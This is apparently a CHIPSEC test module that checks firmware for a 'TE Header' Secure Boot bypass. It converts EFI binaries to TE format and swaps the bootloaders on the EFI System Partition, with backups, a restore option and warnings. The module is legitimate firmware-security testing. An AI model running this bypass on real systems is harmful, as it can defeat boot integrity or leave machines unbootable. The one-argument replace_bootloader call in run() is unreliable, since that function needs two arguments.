#CHIPSEC: Platform Security Assessment Framework
#Copyright (c) 2010-2014, Intel Corporation
# 
#This program is free software; you can redistribute it and/or
#modify it under the terms of the GNU General Public License
#as published by the Free Software Foundation; Version 2.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License
#along with this program; if not, write to the Free Software
#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
#
#Contact information:
#chipsec@intel.com
#

#

#
## \addtogroup tools
# __chipsec/modules/tools/secureboot/te.py__ - tool to test for 'TE Header' vulnerability in Secure Boot implementations
#
import os
import shutil
from chipsec.module_common import *

logger = logger()

g_chain_loader_path = "chipsec/modules/tools/secureboot/chloader.efi"

def dumpstr(s):
    for c in xrange(len(s)):
        print "%02X " % ord(s[c]),
        if ((c+1)%16 == 0):
            print ""
    print ""

#logger.VERBOSE = False

'''
typedef struct _IMAGE_DOS_HEADER
{
     WORD e_magic;
     WORD e_cblp;
     WORD e_cp;
     WORD e_crlc;
     WORD e_cparhdr;
     WORD e_minalloc;
     WORD e_maxalloc;
     WORD e_ss;
     WORD e_sp;
     WORD e_csum;
     WORD e_ip;
     WORD e_cs;
     WORD e_lfarlc;
     WORD e_ovno;
     WORD e_res[4];
     WORD e_oemid;
     WORD e_oeminfo;
     WORD e_res2[10];
     LONG e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
'''
IMAGE_DOS_HEADER = "<14H4HHH10Hi"
IMAGE_DOS_HEADER_size = struct.calcsize(IMAGE_DOS_HEADER)
E_MAGIC = 0x5A4D
E_MAGIC_STR = "MZ"

'''
typedef struct _IMAGE_DATA_DIRECTORY
{
     ULONG VirtualAddress;
     ULONG Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
'''

IMAGE_DATA_DIRECTORY = "<II"
IMAGE_DATA_DIRECTORY_size = struct.calcsize(IMAGE_DATA_DIRECTORY)

IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16

'''
typedef struct _IMAGE_OPTIONAL_HEADER
{
     WORD Magic;
     UCHAR MajorLinkerVersion;
     UCHAR MinorLinkerVersion;
     ULONG SizeOfCode;
     ULONG SizeOfInitializedData;
     ULONG SizeOfUninitializedData;
     ULONG AddressOfEntryPoint;
     ULONG BaseOfCode;
     ULONG BaseOfData;
     ULONG ImageBase;
     ULONG SectionAlignment;
     ULONG FileAlignment;
     WORD MajorOperatingSystemVersion;
     WORD MinorOperatingSystemVersion;
     WORD MajorImageVersion;
     WORD MinorImageVersion;
     WORD MajorSubsystemVersion;
     WORD MinorSubsystemVersion;
     ULONG Win32VersionValue;
     ULONG SizeOfImage;
     ULONG SizeOfHeaders;
     ULONG CheckSum;
     WORD Subsystem;
     WORD DllCharacteristics;
     ULONG SizeOfStackReserve;
     ULONG SizeOfStackCommit;
     ULONG SizeOfHeapReserve;
     ULONG SizeOfHeapCommit;
     ULONG LoaderFlags;
     ULONG NumberOfRvaAndSizes;
     IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER, *PIMAGE_OPTIONAL_HEADER;
'''
IMAGE_OPTIONAL_HEADER = "<HBB9I6H4I2H6I"
IMAGE_OPTIONAL_HEADER_size = struct.calcsize(IMAGE_OPTIONAL_HEADER)
IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b

'''
typedef struct {
  //
  // Standard fields.
  //
  UINT16                    Magic;
  UINT8                     MajorLinkerVersion;
  UINT8                     MinorLinkerVersion;
  UINT32                    SizeOfCode;
  UINT32                    SizeOfInitializedData;
  UINT32                    SizeOfUninitializedData;
  UINT32                    AddressOfEntryPoint;
  UINT32                    BaseOfCode;
  //
  // NT additional fields.
  //
  UINT64                    ImageBase;
  UINT32                    SectionAlignment;
  UINT32                    FileAlignment;
  UINT16                    MajorOperatingSystemVersion;
  UINT16                    MinorOperatingSystemVersion;
  UINT16                    MajorImageVersion;
  UINT16                    MinorImageVersion;
  UINT16                    MajorSubsystemVersion;
  UINT16                    MinorSubsystemVersion;
  UINT32                    Win32VersionValue;
  UINT32                    SizeOfImage;
  UINT32                    SizeOfHeaders;
  UINT32                    CheckSum;
  UINT16                    Subsystem;
  UINT16                    DllCharacteristics;
  UINT64                    SizeOfStackReserve;
  UINT64                    SizeOfStackCommit;
  UINT64                    SizeOfHeapReserve;
  UINT64                    SizeOfHeapCommit;
  UINT32                    LoaderFlags;
  UINT32                    NumberOfRvaAndSizes;
  EFI_IMAGE_DATA_DIRECTORY  DataDirectory[EFI_IMAGE_NUMBER_OF_DIRECTORY_ENTRIES];
} EFI_IMAGE_OPTIONAL_HEADER64;

'''

IMAGE_OPTIONAL_HEADER64 = "<HBBIIIIIQIIHHHHHHIIIIHHQQQQII"
IMAGE_OPTIONAL_HEADER64_size = struct.calcsize(IMAGE_OPTIONAL_HEADER64)
IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b

'''
typedef struct _IMAGE_FILE_HEADER
{
     WORD Machine;
     WORD NumberOfSections;
     ULONG TimeDateStamp;
     ULONG PointerToSymbolTable;
     ULONG NumberOfSymbols;
     WORD SizeOfOptionalHeader;
     WORD Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
'''
IMAGE_FILE_HEADER = "<2H3I2H"
IMAGE_FILE_HEADER_size = struct.calcsize(IMAGE_FILE_HEADER)

'''
typedef struct _IMAGE_NT_HEADERS
{
     ULONG Signature;
     IMAGE_FILE_HEADER FileHeader;
     IMAGE_OPTIONAL_HEADER OptionalHeader;
} IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS;
'''
IMAGE_NT_SIGNATURE = 0x00004550
IMAGE_NT_HEADERS_size = (4 + IMAGE_FILE_HEADER_size + IMAGE_OPTIONAL_HEADER_size + IMAGE_NUMBEROF_DIRECTORY_ENTRIES * IMAGE_DATA_DIRECTORY_size)

'''
typedef struct _IMAGE_SECTION_HEADER
{
     UCHAR Name[8];
     ULONG Misc;
     ULONG VirtualAddress;
     ULONG SizeOfRawData;
     ULONG PointerToRawData;
     ULONG PointerToRelocations;
     ULONG PointerToLinenumbers;
     WORD NumberOfRelocations;
     WORD NumberOfLinenumbers;
     ULONG Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
'''
IMAGE_SECTION_HEADER = "<8s6I2HI"
IMAGE_SECTION_HEADER_size = struct.calcsize(IMAGE_SECTION_HEADER)

'''
PE executable structure

  MS-DOS header
    ...
    e_lfanew -------------------+
                                |
                                |
  IMAGE_NT_HEADERS Header  <----+
   ...
  SECTION TABLE
   ...
'''

'''
TE header

typedef struct {
  UINT16                    Signature;            // signature for TE format = "VZ"
  UINT16                    Machine;              // from the original file header
  UINT8                     NumberOfSections;     // from the original file header
  UINT8                     Subsystem;            // from original optional header
  UINT16                    StrippedSize;         // how many bytes we removed from the header
  UINT32                    AddressOfEntryPoint;  // offset to entry point -- from original optional header
  UINT32                    BaseOfCode;           // from original image -- required for ITP debug
  UINT64                    ImageBase;            // from original file header
  IMAGE_DATA_DIRECTORY      DataDirectory[2];     // only base relocation and debug directory
} EFI_TE_IMAGE_HEADER;
'''

EFI_TE_IMAGE_HEADER = "<HHBBHIIQ"
EFI_TE_IMAGE_HEADER_SIGNATURE = 0x5A56

EFI_IMAGE_DIRECTORY_ENTRY_EXPORT      = 0
EFI_IMAGE_DIRECTORY_ENTRY_IMPORT      = 1
EFI_IMAGE_DIRECTORY_ENTRY_RESOURCE    = 2
EFI_IMAGE_DIRECTORY_ENTRY_EXCEPTION   = 3
EFI_IMAGE_DIRECTORY_ENTRY_SECURITY    = 4
EFI_IMAGE_DIRECTORY_ENTRY_BASERELOC   = 5
EFI_IMAGE_DIRECTORY_ENTRY_DEBUG       = 6
EFI_IMAGE_DIRECTORY_ENTRY_COPYRIGHT   = 7
EFI_IMAGE_DIRECTORY_ENTRY_GLOBALPTR   = 8
EFI_IMAGE_DIRECTORY_ENTRY_TLS         = 9
EFI_IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG =10

EFI_TE_IMAGE_DIRECTORY_ENTRY_BASERELOC = 0
EFI_TE_IMAGE_DIRECTORY_ENTRY_DEBUG     = 1


def IsValidPEHeader(data):
    size = len(data)
    if size < IMAGE_DOS_HEADER_size:
        #print "size < IMAGE_DOS_HEADER_size"
        return False
    signature, = struct.unpack("<H", data[:2])
    if (signature != E_MAGIC):
        #print "signature != E_MAGIC, 0x%04X != 0x%04X" % (E_MAGIC)
        return False
    e_lfanew, = struct.unpack("<I", data[IMAGE_DOS_HEADER_size - 4:IMAGE_DOS_HEADER_size])
    if (e_lfanew >= size):
        #print "e_lfanew >= size"
        return False
    if ((size - e_lfanew) < IMAGE_NT_HEADERS_size):
        #print "(size - e_lfanew) < IMAGE_NT_HEADERS_size"
        return False
    pe_signature, = struct.unpack("<I", data[e_lfanew:e_lfanew+4])
    if (pe_signature != IMAGE_NT_SIGNATURE):
        #print "pe_signature != IMAGE_NT_SIGNATURE"
        return False
    return True

def replace_header(data):
    if (not IsValidPEHeader(data)):
        return None
    size = len(data)
    e_lfanew, = struct.unpack("<I", data[IMAGE_DOS_HEADER_size - 4:IMAGE_DOS_HEADER_size])
    #                          TimeDateStamp, PointerToSymbolTable, NumberOfSymbols, SizeOfOptionalHeader, Characteristics
    Machine, NumberOfSections, u1, u2, u3, SizeOfOptionalHeader, u5 \
     = struct.unpack(IMAGE_FILE_HEADER, data[e_lfanew+4:e_lfanew+4+IMAGE_FILE_HEADER_size])
    StrippedSize = e_lfanew + 4 + IMAGE_FILE_HEADER_size + SizeOfOptionalHeader;
    if (StrippedSize > size):
        #print " *** strip more bytes than the file size"
        return None
    if (StrippedSize & ~0xffff):
        #print " *** strip more than 64K bytes"
        return None
    dof = e_lfanew+4+IMAGE_FILE_HEADER_size
    Magic, = struct.unpack("<H", data[dof:dof+2])
    if   (Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC):
        Magic, MajorLinkerVersion, MinorLinkerVersion, SizeOfCode, SizeOfInitializedData, \
        SizeOfUninitializedData, AddressOfEntryPoint, BaseOfCode, BaseOfData, ImageBase,  \
        SectionAlignment, FileAlignment, MajorOperatingSystemVersion, MinorOperatingSystemVersion, \
        MajorImageVersion, MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion, \
        Win32VersionValue, SizeOfImage, SizeOfHeaders, CheckSum, Subsystem, DllCharacteristics, \
        SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit, LoaderFlags, \
        NumberOfRvaAndSizes = struct.unpack(IMAGE_OPTIONAL_HEADER, data[dof:dof+IMAGE_OPTIONAL_HEADER_size])
        dof = dof + IMAGE_OPTIONAL_HEADER_size
    elif (Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC):
        Magic, MajorLinkerVersion, MinorLinkerVersion, SizeOfCode, SizeOfInitializedData, \
        SizeOfUninitializedData, AddressOfEntryPoint, BaseOfCode, ImageBase, SectionAlignment, \
        FileAlignment, MajorOperatingSystemVersion, MinorOperatingSystemVersion, MajorImageVersion, \
        MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion, Win32VersionValue, \
        SizeOfImage, SizeOfHeaders, CheckSum, Subsystem, DllCharacteristics, SizeOfStackReserve, \
        SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit, LoaderFlags, NumberOfRvaAndSizes \
         = struct.unpack(IMAGE_OPTIONAL_HEADER64, data[dof:dof+IMAGE_OPTIONAL_HEADER64_size])
        dof = dof + IMAGE_OPTIONAL_HEADER64_size
    else:
        #print " *** Unsupported magic: %X" % Magic
        return None
    if (NumberOfSections &~0xFF):
        #print " *** NumberOfSections cannot be packed: %X" % NumberOfSections
        return None
    if (Subsystem &~0xFF):
        #print " *** Subsystem cannot be packed: %X" % NumberOfSections
        return None

    basereloc_off = dof + EFI_IMAGE_DIRECTORY_ENTRY_BASERELOC*IMAGE_DATA_DIRECTORY_size
    debug_off = dof + EFI_IMAGE_DIRECTORY_ENTRY_DEBUG*IMAGE_DATA_DIRECTORY_size
    BASERELOC = "\x00\x00\x00\x00\x00\x00\x00\x00"
    DEBUG     = "\x00\x00\x00\x00\x00\x00\x00\x00"
    if (NumberOfRvaAndSizes > EFI_IMAGE_DIRECTORY_ENTRY_BASERELOC):
        BASERELOC = data[basereloc_off:basereloc_off+IMAGE_DATA_DIRECTORY_size]
    if (NumberOfRvaAndSizes > EFI_IMAGE_DIRECTORY_ENTRY_DEBUG):
        DEBUG = data[debug_off:debug_off+IMAGE_DATA_DIRECTORY_size]
    te_header = struct.pack(EFI_TE_IMAGE_HEADER,\
      EFI_TE_IMAGE_HEADER_SIGNATURE, Machine, NumberOfSections, Subsystem, StrippedSize, AddressOfEntryPoint, BaseOfCode, ImageBase)
    te_data = te_header + BASERELOC + DEBUG + data[StrippedSize:]
    return te_data

def produce_te(fname, outfname):
    data = ''
    with open(fname, 'rb') as f:
        data = f.read()
    te_data = replace_header(data)
    if (te_data == None):
        return 0
    with open(outfname, 'wb') as fte:
        fte.write(te_data)
    return 1

def replace_bootloader(boot_loader, chain_loader):
    logger.log( "[*] Replacing %s.." % boot_loader )
    chain_loader_te = chain_loader+".te"
    if (not os.path.exists(chain_loader_te)):
        produce_te(chain_loader, chain_loader_te)
    # back up bootloader
    backup = boot_loader + ".bak"
    try:
        if (not os.path.exists(backup)):
            os.rename(boot_loader, backup)
        shutil.copy(chain_loader_te, boot_loader)
    except OSError, err:
        logger.error("Cannot replace bootloader (%s). Make sure you run as Administrator" % err)
        return 0
    return 1

import subprocess

def umount(drive):
    if os.path.exists(drive):
        res = subprocess.call(["mountvol.exe", drive, "/D"])
        if (res != 0):
            logger.error("Cannot unmount EFI System partition: %d\n" % res)

def get_efi_mount():
    for l in xrange(ord('z'), ord('a'), -1):
        if (not os.path.exists("%c:\\" % l)):
            res = subprocess.call(["mountvol.exe", "%c:\\" % l, "/S"])
            if (res != 0):
                logger.error("Cannot mount EFI System partition: %d\n" % res)
                return None
            return "%c:\\" % l
    logger.error("Cannot mount EFI System partition. No drive letters to use.\n")
    return None

def replace_bootloader_efi():
    logger.log( "[*] Replacing bootloaders on EFI System Partition (ESP).." )
    dsk = get_efi_mount()
    if dsk is None: return 0
    boot_path_00 = dsk + "EFI\\Boot\\bootia32.efi"
    boot_path_01 = dsk + "EFI\\Boot\\bootx64.efi"
    boot_path_02 = dsk + "EFI\\Microsoft\\Boot\\bootmgfw.efi"
    chain_loader = g_chain_loader_path
    if os.path.exists(boot_path_00):
        replace_bootloader(boot_path_00, chain_loader)
    if os.path.exists(boot_path_01):
        replace_bootloader(boot_path_01, chain_loader)
    if os.path.exists(boot_path_02):
        replace_bootloader(boot_path_02, chain_loader)
    umount(dsk)
    logger.log( "[*] You will need to reboot the system to see the changes" )
    return 1

def restore_bootloader(boot_loader):
    logger.log( "[*] Restoring %s.." % boot_loader )
    backup = boot_loader + ".bak"
    try:
        if not os.path.exists(backup):
            logger.error("Cannot restore bootloader - %s not found" % backup)
            return 0
        if os.path.exists(boot_loader):
            os.remove(boot_loader)
        os.rename(backup, boot_loader)
    except OSError, err:
        logger.error("Cannot restore bootloader (%s). Make sure you run as Administrator" % err)
        return 0
    return 1

def restore_bootloader_efi():
    logger.log( "[*] Restoring bootloaders on EFI System Partition (ESP).." )
    dsk = get_efi_mount()
    if dsk is None: return 0
    boot_path_00 = dsk + "EFI\\Boot\\bootia32.efi"
    boot_path_01 = dsk + "EFI\\Boot\\bootx64.efi"
    boot_path_02 = dsk + "EFI\\Microsoft\\Boot\\bootmgfw.efi"
    if os.path.exists(boot_path_00): restore_bootloader(boot_path_00)
    if os.path.exists(boot_path_01): restore_bootloader(boot_path_01)
    if os.path.exists(boot_path_02): restore_bootloader(boot_path_02)
    umount(dsk)
    logger.log( "[*] You will need to reboot the system to see the changes" )
    return 1

def confirm():
    logger.warn("***************************************************************************************")
    logger.warn("*")
    logger.warn("* RUNNING THIS TOOL MAY RESULT IN UNBOOTABLE OS!")
    logger.warn("* USE IT FOR TESTING PURPOSES ON TEST SYSTEMS ONLY")
    logger.warn("*")
    logger.warn("* If after reboot, Windows still boots then the firmware doesn't properly")
    logger.warn("* enforce Secure Boot checks on TE executables (vulnerability)")
    logger.warn("*")
    logger.warn("* If Windows doesn't boot then Secure Boot correctly blocked TE executable.")
    logger.warn("* To restore Windows in this case you may use one of the follwoing:")
    logger.warn("* - Disable Secure Boot in BIOS setup, boot Linux or UEFI shell from bootable drive")
    logger.warn("*   then restore original bootloader binaries from .bak files")
    logger.warn("* - Use Windows recovery mode which should automatically restore correct executables")
    logger.warn("*")
    logger.warn("* The tool will only automatically replace bootloaders on Windows 8 or higher.")
    logger.warn("* To test on Linux, you'd need to modify EFI executable specified by <filename> argument")
    logger.warn("* then manually replace bootloader with the modified executable")
    logger.warn("*")
    logger.warn("***************************************************************************************")
    s = raw_input( "Type 'yes' to continue running the tool > " )
    if s != 'yes': sys.exit( 0 )

def usage():
    logger.log( 'Usage:\n' +       \
                  'chipsec_main.py -m tools.secureboot.te -a [options]\n' + \
                  '  options:\n' +\
                  '    <filename> - name of EFI binary to be replaced with TE header (optional)\n' + \
                  '                 If no filename is specified, bootloaders (boot<arch>.efi, bootmgfw.efi)\n' + \
                  '                 on ESP will be replaced automatically\n' + \
                  '    restore    - restore original bootloaders on EFI System Partition (ESP) from .bak files\n' )

def run( module_argv ):
    logger.start_test( "'TE Header' Secure Boot Bypass Test" )
    usage()

    if 0 == len(module_argv):
        confirm()
        return replace_bootloader_efi()
    elif 1 == len(module_argv):
        option = module_argv[ 0 ]
        if option == "restore":
            confirm()
            return restore_bootloader_efi()
        else:
            return replace_bootloader( option )
    else:
        logger.error( 'Invalid module arguments' )
        return 0
        #option = module_argv[0]
        #if (option == "restore"):
        #  return restore_bootloader(module_argv[1])
        #else:
        #  logger.error( 'Invalid parameters' )
        #  return 0
